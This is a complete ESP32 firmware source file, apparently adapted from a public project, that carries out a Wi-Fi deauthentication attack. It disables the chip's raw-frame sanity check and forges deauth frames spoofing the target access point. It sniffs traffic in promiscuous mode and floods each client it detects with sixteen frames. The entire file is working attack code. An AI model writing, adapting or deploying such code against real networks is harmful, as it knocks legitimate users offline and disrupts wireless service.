#include "Deauther.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "secrets.h"

/**
 * Based on https://github.com/tesa-klebeband/ESP32-Deauther
 */

/**
 * ESP32 cannot send custom packets unless this function is overridden
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

#define NUM_FRAMES_PER_DEAUTH 16

typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 };
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t sequence_ctrl;
  uint8_t addr4[6];
} mac_hdr_t;

typedef struct {
  mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_packet_t;

const wifi_promiscuous_filter_t filt = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

deauth_frame_t deauth_frame;

IRAM_ATTR void Deauther::sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length > 0 && memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
    memcpy(deauth_frame.station, mac_header->src, 6);

    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
    }
  }
}


void Deauther::start(WifiNetwork network) {
  Serial.println("Starting Deauth-Attack on network: ");
  Serial.println(network.getName());

  WiFi.softAP(WIFI_SSID, WIFI_PASS, network.getChannel());
  deauth_frame.reason = 1; //Unspecified reason
  memcpy(deauth_frame.access_point, network.getBssid(), 6);
  memcpy(deauth_frame.sender, network.getBssid(), 6);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}


void Deauther::stop() {
  Serial.println("Stopping Deauth-Attack...");
  esp_wifi_set_promiscuous(false);
}